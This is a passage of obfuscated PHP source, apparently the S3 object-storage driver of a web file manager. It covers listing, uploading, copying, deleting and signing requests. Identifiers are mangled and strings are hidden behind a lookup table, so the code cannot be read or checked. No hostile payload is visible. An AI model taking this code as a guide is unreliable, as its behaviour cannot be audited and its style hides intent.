$‚õÌĞ¸©[8]; } $™†ıª’« = array_merge($™†ıª’«, $this->slicePath($«Ğ®Ò•¯)); } $ì‰©¿§œ = array(); foreach (array_unique($™†ıª’«) as $¤‘¼•¸ù) { $÷ğûá† = array($‚õÌĞ¸©[87] => $this->getPathOuter($‚õÌĞ¸©[8] . $‡õÇ†ã¹ . $‚õÌĞ¸©[8] . $¤‘¼•¸ù), $‚õÌĞ¸©[78] => 1, $‚õÌĞ¸©[79] => 0); if (substr($¤‘¼•¸ù, -1) != $‚õÌĞ¸©[8]) { $÷ğûá†[$‚õÌĞ¸©[78]] = 0; $›ÎÜÄˆ³ = $this->getPath($‡õÇ†ã¹ . $‚õÌĞ¸©[8] . $¤‘¼•¸ù); if (isset($Šìú´¹ƒ[$›ÎÜÄˆ³])) { $ü°ƒÆÙš = $Šìú´¹ƒ[$›ÎÜÄˆ³]; if (isset($ü°ƒÆÙš[$‚õÌĞ¸©[79]])) { $÷ğûá†[$‚õÌĞ¸©[79]] = intval($ü°ƒÆÙš[$‚õÌĞ¸©[79]]); } if (isset($ü°ƒÆÙš[$‚õÌĞ¸©[206]])) { $÷ğûá†[$‚õÌĞ¸©[88]] = intval($ü°ƒÆÙš[$‚õÌĞ¸©[206]]); } } } $ì‰©¿§œ[] = $÷ğûá†; } return $ì‰©¿§œ; } public function slicePath($ãúŞÙôÅ) { $ÖÊ¸‚ü =& $_SERVER[£ğ°ÖØø]; $áÒ¦Àæ = explode($ÖÊ¸‚ü[8], trim($ãúŞÙôÅ, $ÖÊ¸‚ü[8])); $ÂÑ¡Ìô¶ = 0; do { ++$ÂÑ¡Ìô¶; $ıŒØ…²[] = implode($ÖÊ¸‚ü[8], array_slice($áÒ¦Àæ, 0, $ÂÑ¡Ìô¶)) . $ÖÊ¸‚ü[8]; } while ($ÂÑ¡Ìô¶ < count($áÒ¦Àæ)); $ıŒØ…²[count($áÒ¦Àæ) - 1] = $ãúŞÙôÅ; return $ıŒØ…²; } public function getHost() { $²·ö¶µû =& $_SERVER[£ğ°ÖØø]; $ §´©‘… = parse_url(trim($this->domain, $²·ö¶µû[8])); $³Œæ¡‚ = isset($ §´©‘…[$²·ö¶µû[207]]) ? $ §´©‘…[$²·ö¶µû[207]] : http_type(); $Ã¼Ô•âí = isset($ §´©‘…[$²·ö¶µû[208]]) ? $ §´©‘…[$²·ö¶µû[208]] : $ §´©‘…[$²·ö¶µû[87]]; if (isset($ §´©‘…[$²·ö¶µû[209]])) { $Ã¼Ô•âí .= $²·ö¶µû[4] . $ §´©‘…[$²·ö¶µû[209]]; } return $³Œæ¡‚ . $²·ö¶µû[210] . $Ã¼Ô•âí; } public function pathEncode($ÃŞè×´©) { $È‰¦—€õ =& $_SERVER[£ğ°ÖØø]; return str_replace($È‰¦—€õ[211], $È‰¦—€õ[8], rawurlencode($ÃŞè×´©)); } public function writeLog($ÏÉ‰Ãı³ = '', $„ÆÌĞï = false) { $­ÁŸ°› =& $_SERVER[£ğ°ÖØø]; $ëÜ¢ò€¬ = in_array(ACTION, array($­ÁŸ°›[212], $­ÁŸ°›[213])); if (!$ëÜ¢ò€¬ && !GLOBAL_DEBUG) { return; } $úêËâß = $ÏÉ‰Ãı³; static $—áş¼…ó = null; if (!$—áş¼…ó) { $—áş¼…ó = strtoupper($this->getType()); } $ÏÉ‰Ãı³ = $—áş¼…ó . $­ÁŸ°›[214] . $ÏÉ‰Ãı³; if ($„ÆÌĞï) { $ĞÇ©·† = error_get_last(); if ($ĞÇ©·†) { $ÏÉ‰Ãı³ = array($ÏÉ‰Ãı³, $ĞÇ©·†); } } write_log($ÏÉ‰Ãı³, $­ÁŸ°›[215]); if ($ëÜ¢ò€¬) { throw new Exception($úêËâß); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¿­êÆ‚Û) { set_timeout(); require_once SDK_DIR . $_SERVER[£ğ°ÖØø][216]; parent::__construct(); $this->_init($¿­êÆ‚Û); } public function _init($îêíËƒå) { $õ¨á‚¢ =& $_SERVER[£ğ°ÖØø]; $this->config = $îêíËƒå; foreach ($îêíËƒå as $õõ­›ÙÆ => $é§²²) { if (isset($this->{$õõ­›ÙÆ})) { $this->{$õõ­›ÙÆ} = $é§²²; } } $this->endpoint = $îêíËƒå[$õ¨á‚¢[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($õ¨á‚¢[212], $õ¨á‚¢[213]))) { $this->client->setExceptions(); } } public function setSignVersion($ö†ØõÍû = "\166\x34") { $this->signVer = $ö†ØõÍû; $this->client->setSignatureVersion($ö†ØõÍû); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $¼Ş®—¾Ö) { return null; } } public function isBucketCors() { $“îùöı° =& $_SERVER[£ğ°ÖØø]; $•²Î±íâ = $this->getBucketCors(); if (!$•²Î±íâ || !is_array($•²Î±íâ)) { return !1; } if (!is_array($•²Î±íâ[$“îùöı°[218]])) { $•²Î±íâ[$“îùöı°[218]] = explode($“îùöı°[50], $•²Î±íâ[$“îùöı°[218]]); } if ($•²Î±íâ[$“îùöı°[219]] != $“îùöı°[220] || !in_array($“îùöı°[220], $•²Î±íâ[$“îùöı°[218]])) { return !1; } $¤Ï‘ ï© = array_map($“îùöı°[221], $•²Î±íâ[$“îùöı°[222]]); if (!is_array($¤Ï‘ ï©)) { $¤Ï‘ ï© = array(); } $²› Ú²• = array($“îùöı°[223], $“îùöı°[224], $“îùöı°[225], $“îùöı°[226], $“îùöı°[227]); $èøÕìĞÔ = array_diff($²› Ú²•, $¤Ï‘ ï©); return empty($èøÕìĞÔ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($‘‡¡Ù Ñ, $×ºäá³® = '', $ìõ–‘’Ï = REPEAT_RENAME) { $Œ˜´ø°¨ = $this->setContent($‘‡¡Ù Ñ, $×ºäá³®); if ($Œ˜´ø°¨ !== !1) { return $this->getPathOuter($‘‡¡Ù Ñ); } return !1; } public function mkdir($·æ×üÈà, $ú•¥îåó = REPEAT_SKIP) { $ƒá®õ½Û =& $_SERVER[£ğ°ÖØø]; if (empty($·æ×üÈà) && $·æ×üÈà !== $ƒá®õ½Û[228]) { return !1; } if ($ú•¥îåó && $this->_isFolder($·æ×üÈà)) { return $this->getPathOuter($·æ×üÈà); } $Æ™‘‘ª = $this->setContent($·æ×üÈà, $ƒá®õ½Û[12], !0); if ($Æ™‘‘ª !== !1) { return $this->getPathOuter($·æ×üÈà); } return !1; } public function copyFile($¦ØÌ»õ´, $§ŒÆşˆ, $ÉÚÛÌÁ = array()) { $¤™„ã =& $_SERVER[£ğ°ÖØø]; $÷’ºâ¢ = $this->objectMeta($¦ØÌ»õ´); if (!$÷’ºâ¢) { return !1; } if ($÷’ºâ¢[$¤™„ã[79]] <= 1024 * 1024 * 200) { $‡ÄÜÎœ = $this->client->copyObject($this->bucket, $¦ØÌ»õ´, $this->bucket, $§ŒÆşˆ, $¤™„ã[229], $ÉÚÛÌÁ); } else { $‡ÄÜÎœ = $this->client->multiCopyObject($this->bucket, $¦ØÌ»õ´, $this->bucket, $§ŒÆşˆ, $ÉÚÛÌÁ); } $‡ÄÜÎœ = $‡ÄÜÎœ ? $this->getPathOuter($§ŒÆşˆ) : !1; return $‡ÄÜÎœ; } public function moveFile($¾‰Şúİ, $Åğı¨Ìß) { if ($this->copyFile($¾‰Şúİ, $Åğı¨Ìß)) { $this->delFile($¾‰Şúİ); return $this->getPathOuter($Åğı¨Ìß); } return !1; } public function delFile($ÓşÅ×ÉÉ) { return $this->client->deleteObject($this->bucket, $ÓşÅ×ÉÉ); } public function delFolder($òÔÄ“í¼) { $œ¨™‹É† =& $_SERVER[£ğ°ÖØø]; if (!$this->exist($òÔÄ“í¼)) { return !0; } $this->listItemCache = !1; $úôóÍñ = $this->fileList($òÔÄ“í¼); $this->listItemCache = !0; $µ¥ğÈü = trim($òÔÄ“í¼, $œ¨™‹É†[8]) . $œ¨™‹É†[8]; if (!empty($òÔÄ“í¼) && $òÔÄ“í¼ !== $œ¨™‹É†[228] && !in_array($µ¥ğÈü, $úôóÍñ[$œ¨™‹É†[85]])) { $úôóÍñ[$œ¨™‹É†[85]][] = $µ¥ğÈü; } $±ôİ¦¶ = $this->delByBatch($úôóÍñ[$œ¨™‹É†[86]]); if (!$±ôİ¦¶) { return !1; } $±ôİ¦¶ = $this->delByBatch($úôóÍñ[$œ¨™‹É†[85]]); if (!$±ôİ¦¶) { return !1; } return $this->delFile($µ¥ğÈü); } private function delByBatch($ô§ı”’) { foreach (array_chunk($ô§ı”’, 1000) as $’ğåÎöö) { $íêàÙúÇ = $this->client->deleteObjects($this->bucket, $’ğåÎöö); if (!$íêàÙúÇ) { return !1; } } return !0; } public function rename($°õé•§­, $¡­÷±Ü) { return $this->renameObject($°õé•§­, $¡­÷±Ü); } public function listPath($‹ôªµğÕ, $õÆ›ä‰ì = false) { $Òâğğ²ğ =& $_SERVER[£ğ°ÖØø]; $À…×Â´ = $this->fileList($‹ôªµğÕ, $Òâğğ²ğ[8], !0); foreach ($À…×Â´[$Òâğğ²ğ[85]] as $ü¯ò×ÉÒ => $ı¸°¤şí) { $À…×Â´[$Òâğğ²ğ[85]][$ü¯ò×ÉÒ] = $this->folderInfo($ı¸°¤şí, $õÆ›ä‰ì, $ı¸°¤şí); } foreach ($À…×Â´[$Òâğğ²ğ[86]] as $ü¯ò×ÉÒ => $ı¸°¤şí) { $À…×Â´[$Òâğğ²ğ[86]][$ü¯ò×ÉÒ] = $this->fileInfo($ı¸°¤şí[$Òâğğ²ğ[32]], $õÆ›ä‰ì, $ı¸°¤şí); } return $À…×Â´; } protected function infoChildren($É–¨Â³½, &$÷’û€Œ÷) { $÷ì¨¶ØŞ =& $_SERVER[£ğ°ÖØø]; $·«•Â¨ = $this->fileList($É–¨Â³½, $÷ì¨¶ØŞ[12], !0); $÷’û€Œ÷[$÷ì¨¶ØŞ[81]] += count($·«•Â¨[$÷ì¨¶ØŞ[85]]); $÷’û€Œ÷[$÷ì¨¶ØŞ[80]] += count($·«•Â¨[$÷ì¨¶ØŞ[86]]); foreach ($·«•Â¨[$÷ì¨¶ØŞ[86]] as $œ©†¤³×) { if (!$œ©†¤³× || !$œ©†¤³×[$÷ì¨¶ØŞ[79]]) { continue; } $÷’û€Œ÷[$÷ì¨¶ØŞ[79]] += $œ©†¤³×[$÷ì¨¶ØŞ[79]]; } } private function fileInfo($çèüÌ¢, $ŸÁñ“î = false, $Î˜¥ØıÒ = array()) { $‡­•âøº =& $_SERVER[£ğ°ÖØø]; $Ò®ñíåÍ = array($‡­•âøº[32] => $this->pathThis($çèüÌ¢), $‡­•âøº[87] => $this->getPathOuter($çèüÌ¢), $‡­•âøº[33] => $‡­•âøº[230], $‡­•âøº[169] => $this->ext($çèüÌ¢), $‡­•âøº[79] => isset($Î˜¥ØıÒ[$‡­•âøº[79]]) ? $Î˜¥ØıÒ[$‡­•âøº[79]] : 0); if ($ŸÁñ“î) { return $Ò®ñíåÍ; } $Ò®ñíåÍ[$‡­•âøº[231]] = $Ò®ñíåÍ[$‡­•âøº[88]] = 0; $Ò®ñíåÍ[$‡­•âøº[232]] = $Ò®ñíåÍ[$‡­•âøº[233]] = !0; if (empty($Î˜¥ØıÒ)) { $Î˜¥ØıÒ = $this->objectMeta($çèüÌ¢); if (!$Î˜¥ØıÒ) { return $Ò®ñíåÍ; } } if (isset($Î˜¥ØıÒ[$‡­•âøº[234]]) && $Î˜¥ØıÒ[$‡­•âøº[234]]) { $Ò®ñíåÍ[$‡­•âøº[235]] = $Î˜¥ØıÒ[$‡­•âøº[234]]; } if (isset($Î˜¥ØıÒ[$‡­•âøº[206]])) { $Ò®ñíåÍ[$‡­•âøº[88]] = $Î˜¥ØıÒ[$‡­•âøº[206]]; } if (isset($Î˜¥ØıÒ[$‡­•âøº[79]])) { $Ò®ñíåÍ[$‡­•âøº[79]] = $Î˜¥ØıÒ[$‡­•âøº[79]]; } return $Ò®ñíåÍ; } private function folderInfo($¾ŸŸßµÀ, $£¼æÅÄ = false, $Êí¶¼®Å = array()) { $ÌŒ†×õ =& $_SERVER[£ğ°ÖØø]; $ó§ß€ = array($ÌŒ†×õ[32] => $this->pathThis($¾ŸŸßµÀ), $ÌŒ†×õ[87] => $this->getPathOuter($ÌŒ†×õ[8] . $¾ŸŸßµÀ), $ÌŒ†×õ[33] => $ÌŒ†×õ[78]); if ($£¼æÅÄ) { return $ó§ß€; } $ó§ß€[$ÌŒ†×õ[231]] = $ó§ß€[$ÌŒ†×õ[88]] = 0; $ó§ß€[$ÌŒ†×õ[232]] = $ó§ß€[$ÌŒ†×õ[233]] = !0; if ($¾ŸŸßµÀ == $ÌŒ†×õ[12]) { return $ó§ß€; } if (empty($Êí¶¼®Å)) { $Êí¶¼®Å = $this->objectMeta(trim($¾ŸŸßµÀ, $ÌŒ†×õ[8]) . $ÌŒ†×õ[8]); } if (isset($Êí¶¼®Å[$ÌŒ†×õ[206]])) { $ó§ß€[$ÌŒ†×õ[231]] = $Êí¶¼®Å[$ÌŒ†×õ[206]]; } return $ó§ß€; } private function fileList($Îš¯óëŒ, $Ïæñìë = '', $Ì½ÄÀ˜Á = 0) { $Ù²ƒÏ²ô =& $_SERVER[£ğ°ÖØø]; $‰ÅÈıü¸ = rtrim($Îš¯óëŒ, $Ù²ƒÏ²ô[8]) . $Ù²ƒÏ²ô[8]; $—ÅÇœÈ÷ = $this->listObjs($‰ÅÈıü¸, null, null, $Ïæñìë); if (!$—ÅÇœÈ÷) { return array($Ù²ƒÏ²ô[85] => array(), $Ù²ƒÏ²ô[86] => array()); } $£èªÏ©„ = $È§ÇÈœ÷ = array(); foreach ($—ÅÇœÈ÷[$Ù²ƒÏ²ô[236]] as $Õ‹ù­üÖ) { $¯‹§ß‡Ğ = $Õ‹ù­üÖ[$Ù²ƒÏ²ô[32]]; if ($¯‹§ß‡Ğ == $‰ÅÈıü¸) { continue; } $äÔŒñ±­ = isset($Õ‹ù­üÖ[$Ù²ƒÏ²ô[79]]) ? $Õ‹ù­üÖ[$Ù²ƒÏ²ô[79]] : 0; $•à³ãß = $äÔŒñ±­ == 0 && substr($¯‹§ß‡Ğ, strlen($¯‹§ß‡Ğ) - 1, 1) == $Ù²ƒÏ²ô[8] ? !0 : !1; $this->cacheMethodInfoSet($¯‹§ß‡Ğ, $•à³ãß, $Õ‹ù­üÖ); if ($•à³ãß) { $£èªÏ©„[] = $¯‹§ß‡Ğ; continue; } $È§ÇÈœ÷[] = $Ì½ÄÀ˜Á ? $Õ‹ù­üÖ : $¯‹§ß‡Ğ; } foreach ($—ÅÇœÈ÷[$Ù²ƒÏ²ô[237]] as $Õ‹ù­üÖ) { $£èªÏ©„[] = $Õ‹ù­üÖ[$Ù²ƒÏ²ô[32]]; $this->cacheMethodInfoSet($Õ‹ù­üÖ[$Ù²ƒÏ²ô[32]], !0); } $this->cacheMethodInfoSet($Îš¯óëŒ, !0); return array($Ù²ƒÏ²ô[85] => $£èªÏ©„, $Ù²ƒÏ²ô[86] => $È§ÇÈœ÷); } private function listObjs($ÎÔÜ­£“, $¾‘´„ = null, $ÎÅÍ‰Ò = null, $ÏÅÑ¸æó = null) { $äòëüËş =& $_SERVER[£ğ°ÖØø]; $ÎÔÜ­£“ = trim($ÎÔÜ­£“, $äòëüËş[8]); $¤œ»÷Úã = empty($ÎÔÜ­£“) && $ÎÔÜ­£“ !== $äòëüËş[228] ? $äòëüËş[12] : $ÎÔÜ­£“ . $äòëüËş[8]; return $this->client->getBucket($this->bucket, $¤œ»÷Úã, $¾‘´„, $ÎÅÍ‰Ò, $ÏÅÑ¸æó, !0); } public function has($¬¾¦òŠ, $‘â¾•àŸ = false, $·öÄµù¬ = true) { $Ø”ííÉ =& $_SERVER[£ğ°ÖØø]; $¬¾¦òŠ = trim($¬¾¦òŠ, $Ø”ííÉ[8]); $ëåó÷äÅ = empty($¬¾¦òŠ) && $¬¾¦òŠ !== $Ø”ííÉ[228] ? $Ø”ííÉ[12] : $¬¾¦òŠ . $Ø”ííÉ[8]; $ï‹µÙâ = null; $Œ“©¾×Ñ = 500; $Óû’…¡Ê = $Ø”ííÉ[8]; $¢êŒŞ•¡ = $‰öúÄè¼ = array(); while (!0) { $İÕ³´¿Ê = $this->listObjs($¬¾¦òŠ, $ï‹µÙâ, $Œ“©¾×Ñ, $Óû’…¡Ê); if (!$İÕ³´¿Ê) { break; } $ï‹µÙâ = $İÕ³´¿Ê[$Ø”ííÉ[238]]; $½üÄ«òÃ = $İÕ³´¿Ê[$Ø”ííÉ[236]]; $ˆí£ë€‰ = $İÕ³´¿Ê[$Ø”ííÉ[237]]; if (empty($½üÄ«òÃ) && empty($ˆí£ë€‰)) { break; } if (count($½üÄ«òÃ) == 1 && $½üÄ«òÃ[0][$Ø”ííÉ[32]] == $ëåó÷äÅ) { break; } if ($‘â¾•àŸ) { if (count($½üÄ«òÃ)) { $½üÄ«òÃ = array_column($½üÄ«òÃ, $Ø”ííÉ[32]); $¢êŒŞ•¡ = array_merge($¢êŒŞ•¡, $½üÄ«òÃ); } if (count($ˆí£ë€‰)) { $ˆí£ë€‰ = array_column($ˆí£ë€‰, $Ø”ííÉ[32]); $‰öúÄè¼ = array_merge($‰öúÄè¼, $ˆí£ë€‰); } if ($ï‹µÙâ === null) { break; } continue; } if ($·öÄµù¬) { if (!empty($½üÄ«òÃ)) { if (count($½üÄ«òÃ) > 1 || isset($½üÄ«òÃ[0][$Ø”ííÉ[32]]) && $½üÄ«òÃ[0][$Ø”ííÉ[32]] != $ëåó÷äÅ) { return !0; } } } else { if (!empty($ˆí£ë€‰)) { return !0; } } if ($ï‹µÙâ === null) { break; } } if ($‘â¾•àŸ) { $¢êŒŞ•¡ = array_diff($¢êŒŞ•¡, array($ëåó÷äÅ)); $¢êŒŞ•¡ = count(array_unique($¢êŒŞ•¡)); $‰öúÄè¼ = count(array_unique($‰öúÄè¼)); return array($Ø”ííÉ[239] => $¢êŒŞ•¡, $Ø”ííÉ[240] => $‰öúÄè¼); } return !1; } public function listAll($ªÚÜá³ö) { $ëÕÙµ± =& $_SERVER[£ğ°ÖØø]; $ÚíÖ¨¿ = $this->fileList($ªÚÜá³ö, $ëÕÙµ±[12], !0); $îÉò½š© = array_to_keyvalue($ÚíÖ¨¿[$ëÕÙµ±[86]], $ëÕÙµ±[32]); foreach ($ÚíÖ¨¿[$ëÕÙµ±[85]] as $Ïç°Â·) { if (is_string($Ïç°Â·)) { $îÉò½š©[$Ïç°Â·] = array($ëÕÙµ±[79] => 0); } } return $this->listAllFiles($ªÚÜá³ö, $îÉò½š©); } public function canRead($æ”Â«ğà) { $Ÿƒ­‡–İ =& $_SERVER[£ğ°ÖØø]; $ÅÅÈö» = $this->client->getAccessControlPolicy($this->bucket, $æ”Â«ğà); if (!$ÅÅÈö») { return !1; } return in_array($ÅÅÈö», array($Ÿƒ­‡–İ[241], $Ÿƒ­‡–İ[242], $Ÿƒ­‡–İ[243])) ? !0 : !1; } public function canWrite($÷˜³‹‹Ò) { $â¯««ÃÉ =& $_SERVER[£ğ°ÖØø]; $ş¯â³•Õ = $this->client->getAccessControlPolicy($this->bucket, $÷˜³‹‹Ò); if (!$ş¯â³•Õ) { return !1; } return in_array($ş¯â³•Õ, array($â¯««ÃÉ[241], $â¯««ÃÉ[242])) ? !0 : !1; } public function getContent($–ÆÃÃå) { return $this->client->getObject($this->bucket, $–ÆÃÃå); } public function setContent($˜ìôÎ¤´, $ßë›Ğ¾° = '', $½§Ÿú¯ = false) { $ş‹µ ˜¸ =& $_SERVER[£ğ°ÖØø]; $˜ìôÎ¤´ = $½§Ÿú¯ ? trim($˜ìôÎ¤´, $ş‹µ ˜¸[8]) . $ş‹µ ˜¸[8] : $˜ìôÎ¤´; $‹úÛª¬‚ = get_file_mime(get_path_ext($˜ìôÎ¤´)); $èù„½âú = $this->client->putObject($ßë›Ğ¾°, $this->bucket, $˜ìôÎ¤´, $ş‹µ ˜¸[229], array(), $‹úÛª¬‚); if (!$èù„½âú) { return !1; } if ($½§Ÿú¯) { return !0; } return $èù„½âú ? !0 : !1; } public function fileSubstr($œÂí«Ï—, $åÏ´ ùÎ, $ŸõÉ‹) { $ôÚÎšÁÍ = $åÏ´ ùÎ + $ŸõÉ‹ - 1; return $this->client->getObject($this->bucket, $œÂí«Ï—, array($_SERVER[£ğ°ÖØø][244] => "\x62\x79\x74\145\x73\x3d{$åÏ´ ùÎ}\55{$ôÚÎšÁÍ}")); } public function upload($¬á”­, $äûé½ÎÃ, $÷¨™à³‚ = false, $©ïÃ¨Ô° = REPEAT_REPLACE) { $¹¬¡÷Ç¹ =& $_SERVER[£ğ°ÖØø]; $Ò›ÁÂş‰ = array($¹¬¡÷Ç¹[245] => @md5_file($äûé½ÎÃ)); $¸—µßÎ = array($¹¬¡÷Ç¹[246] => get_file_mime(get_path_ext($¬á”­))); if (IO::size($äûé½ÎÃ) <= 1024 * 1024 * 200) { $å‹ÀÂÜÈ = $this->client->putObjectFile($äûé½ÎÃ, $this->bucket, $¬á”­, $¹¬¡÷Ç¹[229], $Ò›ÁÂş‰, $¸—µßÎ); return !empty($å‹ÀÂÜÈ) ? $this->getPathOuter($¬á”­) : !1; } $Öõ½˜ÆÊ = $this->client->multiUploadObject($äûé½ÎÃ, $this->bucket, trim($¬á”­, $¹¬¡÷Ç¹[8]), $Ò›ÁÂş‰, $¸—µßÎ); return $Öõ½˜ÆÊ ? $this->getPathOuter($¬á”­) : !1; } public function download($šÎÑ§‘, $š›¥«) { if (!@is_dir($this->pathFather($š›¥«)) && !IO::mkdir($this->pathFather($š›¥«))) { return !1; } $É—ûñŠˆ = $this->client->getObject($this->bucket, $šÎÑ§‘, array(), $š›¥«); return $É—ûñŠˆ !== !1 ? $š›¥« : !1; } public function link($é©ı«ú”, $¶ªĞ…é¥ = array()) { $Äª©éğ =& $_SERVER[£ğ°ÖØø]; if ($this->signVer == $Äª©éğ[247]) { return $this->client->getAuthenticatedURL($this->bucket, $é©ı«ú”, 3600 * 12, $¶ªĞ…é¥); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($é©ı«ú”, $Äª©éğ[8]), 3600 * 12, $this->region, array(), !0, $¶ªĞ…é¥); } public function fileOut($ˆ¨ùÙ¼­, $÷İ Ğº³ = false, $Ä‡¾ÒÂ = false, $Ã»ööé = '') { $ªìÌ«ÁÓ =& $_SERVER[£ğ°ÖØø]; if ($this->isFileOutServer()) { return $this->fileOutServer($ˆ¨ùÙ¼­, $÷İ Ğº³, $Ä‡¾ÒÂ, $Ã»ööé); } if (!$Ä‡¾ÒÂ) { $Ä‡¾ÒÂ = $this->pathThis($ˆ¨ùÙ¼­); } $ºÉÁ–ó€ = get_file_mime(get_path_ext($Ä‡¾ÒÂ)); if ($ºÉÁ–ó€ == $ªìÌ«ÁÓ[248]) { return parent::fileOut($ˆ¨ùÙ¼­, $÷İ Ğº³, $Ä‡¾ÒÂ, $Ã»ööé); } $×Ğ¤å»™ = array($ªìÌ«ÁÓ[249] => $ºÉÁ–ó€); if ($÷İ Ğº³) { $×Ğ¤å»™[$ªìÌ«ÁÓ[250]] = $ªìÌ«ÁÓ[251] . rawurlencode($Ä‡¾ÒÂ); } else { } $‹–‘Áà¹ = $this->link($ˆ¨ùÙ¼­, $×Ğ¤å»™); $this->fileOutLink($‹–‘Áà¹); } public function fileOutServer($Ï²ÏÇî, $´îü¥– = false, $«éû“Ÿ = false, $¼¯Ïı« = '') { parent::fileOut($Ï²ÏÇî, $´îü¥–, $«éû“Ÿ, $¼¯Ïı«); } public function fileOutImageServer($™Èñå¹, $şöø„îû = 250) { parent::fileOutImage($™Èñå¹, $şöø„îû); } public function hashMd5($å¥ê·‘Ö, $ığ¨²ªğ = '') { $éææ¡§ş = $this->objectMeta($å¥ê·‘Ö); if (!$éææ¡§ş) { return !1; } $ığ¨²ªğ = $ığ¨²ªğ ? $ığ¨²ªğ : _get($éææ¡§ş, $_SERVER[£ğ°ÖØø][252]); return $ığ¨²ªğ; } public function uploadFormData($íÖê‘ù, $ĞèÆí¶Ó = 3600) { $¬³ò¯ÒÑ =& $_SERVER[£ğ°ÖØø]; $™¼á÷Ú² = $this->pathFather($íÖê‘ù); $ÏÛá¹İ÷ = $this->client->getHttpUploadPostParams($this->bucket, $™¼á÷Ú², $¬³ò¯ÒÑ[229], $ĞèÆí¶Ó); return array_merge((array) $ÏÛá¹İ÷, array($¬³ò¯ÒÑ[208] => $this->getHost())); } public function multiUploadFormData($¨‹²úÈæ, $òŒµâæ = 3600) { $•ÅÀ« =& $_SERVER[£ğ°ÖØø]; $ú¼÷ì°® = gmdate($•ÅÀ«[253]); $Ö¡€ØŠÅ = array(); $¡ûşˆñÇ = $this->client->getUploadId($this->bucket, $¨‹²úÈæ, $Ö¡€ØŠÅ); if (!$¡ûşˆñÇ) { return !1; } return array($•ÅÀ«[254] => $¡ûşˆñÇ, $•ÅÀ«[208] => $this->getHost() . $•ÅÀ«[8] . $this->pathEncode($¨‹²úÈæ), $•ÅÀ«[255] => $ú¼÷ì°®, $•ÅÀ«[97] => $¨‹²úÈæ); } public function multiUploadAuthData($—’ù±‡¢, $Í´¿ŸÒ¿ = array()) { $Ó…šêåı =& $_SERVER[£ğ°ÖØø]; $š¢ç¨ó¶ = isset($Í´¿ŸÒ¿[$Ó…šêåı[255]]) ? $Í´¿ŸÒ¿[$Ó…šêåı[255]] : gmdate($Ó…šêåı[253]); $¹ª™Ùˆ— = isset($Í´¿ŸÒ¿[$Ó…šêåı[169]]) ? $Í´¿ŸÒ¿[$Ó…šêåı[169]] : $Ó…šêåı[12]; $–‡ú×Ï = $Í´¿ŸÒ¿[$Ó…šêåı[97]]; unset($Í´¿ŸÒ¿[$Ó…šêåı[97]]); if (isset($Í´¿ŸÒ¿[$Ó…šêåı[256]])) { $Í´¿ŸÒ¿[$Ó…šêåı[255]] = $š¢ç¨ó¶; return $this->listUploadParts($–‡ú×Ï, $Í´¿ŸÒ¿); } $÷£Ë†É½ = array($Ó…šêåı[257], $Ó…šêåı[12], $Ó…šêåı[123], $Ó…šêåı[12], "\x78\x2d\x61\x6d\172\x2d\x64\x61\164\145\72{$š¢ç¨ó¶}", $Ó…šêåı[8] . $this->bucket . $Ó…šêåı[8] . $this->pathEncode($–‡ú×Ï) . $¹ª™Ùˆ—); if (strpos($¹ª™Ùˆ—, $Ó…šêåı[258]) === 0) { $÷£Ë†É½[0] = $Ó…šêåı[259]; } if (isset($Í´¿ŸÒ¿[$Ó…šêåı[260]]) && $Í´¿ŸÒ¿[$Ó…šêåı[260]] == $Ó…šêåı[261]) { $÷£Ë†É½[0] = $Ó…šêåı[261]; } $’À’Ğô‚ = implode($Ó…šêåı[262], $÷£Ë†É½); $«ô¾¿œ = base64_encode(hash_hmac($Ó…šêåı[263], $’À’Ğô‚, $this->secret, !0)); $¯÷áÏàè = $Ó…šêåı[264] . $this->accessKey . $Ó…šêåı[4] . $«ô¾¿œ; if (strpos($¹ª™Ùˆ—, $Ó…šêåı[258]) === 0) { return array($Ó…šêåı[265] => $¯÷áÏàè, $Ó…šêåı[255] => $š¢ç¨ó¶); } return $¯÷áÏàè; } public function listUploadParts($ˆ²ÅâŠ¨, $É”ÊÅéş = array()) { $ò“‰æ€» =& $_SERVER[£ğ°ÖØø]; $Ä£ê”× = str_replace($ò“‰æ€»[266], $ò“‰æ€»[12], $É”ÊÅéş[$ò“‰æ€»[169]]); $Æ‡ôÌ¢÷ = $this->client->listParts($this->bucket, $ˆ²ÅâŠ¨, $Ä£ê”×); if (!$Æ‡ôÌ¢÷) { return !1; } unset($É”ÊÅéş[$ò“‰æ€»[256]], $É”ÊÅéş[$ò“‰æ€»[260]]); $É”ÊÅéş[$ò“‰æ€»[97]] = $ˆ²ÅâŠ¨; $õ´Ãò´Œ = $this->multiUploadAuthData($ˆ²ÅâŠ¨, $É”ÊÅéş); if (empty($õ´Ãò´Œ)) { return !1; } return array($ò“‰æ€»[265] => $õ´Ãò´Œ, $ò“‰æ€»[255] => $É”ÊÅéş[$ò“‰æ€»[255]], $ò“‰æ€»[267] => $Æ‡ôÌ¢÷); } public function getHost() { $ú§¯ŸÑ =& $_SERVER[£ğ°ÖØø]; $ö º‘²ò = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ú§¯ŸÑ[70], $ú§¯ŸÑ[64], $ú§¯ŸÑ[69], $ú§¯ŸÑ[62]))) { return $ö º‘²ò . $ú§¯ŸÑ[8] . $this->bucket; } $ö º‘²ò = explode($ú§¯ŸÑ[210], $ö º‘²ò); return $ö º‘²ò[0] . $ú§¯ŸÑ[210] . $this->bucket . $ú§¯ŸÑ[10] . $ö º‘²ò[1]; } public function size($¨ÉìØş˜) { $ş£ÕÇƒ£ = $this->objectMeta($¨ÉìØş˜); return $ş£ÕÇƒ£ ? $ş£ÕÇƒ£[$_SERVER[£ğ°ÖØø][79]] : 0; } public function info($ÃÚÇ¤) { if ($this->isFolder($ÃÚÇ¤)) { return $this->folderInfo($ÃÚÇ¤); } else { if ($this->isFile($ÃÚÇ¤)) { return $this->fileInfo($ÃÚÇ¤); } } return !1; } public function exist($¨¹¹Íâ“) { return $this->isFile($¨¹¹Íâ“) || 